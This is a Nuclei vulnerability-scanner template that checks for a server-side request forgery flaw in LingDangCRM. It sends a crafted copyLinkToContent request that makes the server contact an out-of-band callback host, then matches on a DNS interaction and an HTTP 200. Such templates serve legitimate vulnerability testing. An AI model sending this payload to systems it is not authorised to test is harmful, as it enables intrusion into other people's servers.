id: LingDangCRM-copyLinkToContent-SSRF

info:
  name: LingDangCRM-copyLinkToContent-SSRF
  author: iSee857
  severity: high
  description: |
    LingDangCRM-copyLinkToContent-SSRF

http:
  - raw:
      - |
        GET /crm/WeiXinApp/marketing/index.php?module=Articles&action=copyLinkToContent&url=http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: status
        status:
          - 200